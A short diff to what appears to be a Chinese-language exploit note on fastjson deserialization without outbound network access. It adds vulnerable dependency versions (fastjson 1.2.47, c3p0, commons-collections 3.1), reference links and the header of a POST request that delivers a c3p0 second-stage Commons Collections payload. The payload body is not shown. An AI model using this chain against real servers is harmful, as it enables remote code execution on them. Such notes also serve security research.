@@ -3,6 +3,30 @@ fastjson不出网回显利用
 
 
 ```
+<dependency>
+            <groupId>com.alibaba</groupId>
+            <artifactId>fastjson</artifactId>
+            <version>1.2.47</version>
+        </dependency>
+
+        <dependency>
+            <groupId>com.mchange</groupId>
+            <artifactId>c3p0</artifactId>
+            <version>0.9.5.2</version>
+        </dependency>
+        <dependency>
+            <groupId>commons-collections</groupId>
+            <artifactId>commons-collections</artifactId>
+            <version>3.1</version>
+        </dependency>
+```
+
+回显方法：https://blog.csdn.net/fnmsd/article/details/106890242
+
+
+通过c3p0 二次反序列化 cc payload
+
+```
 POST /json HTTP/1.1
 Host: 127.0.0.1:8999
 Upgrade-Insecure-Requests: 1
@@ -22,3 +46,4 @@ Content-Length: 8925
 
 # 参考
 http://redteam.today/2020/04/18/c3p0%E7%9A%84%E4%B8%89%E4%B8%AAgadget/
+https://blog.csdn.net/fnmsd/article/details/106890242
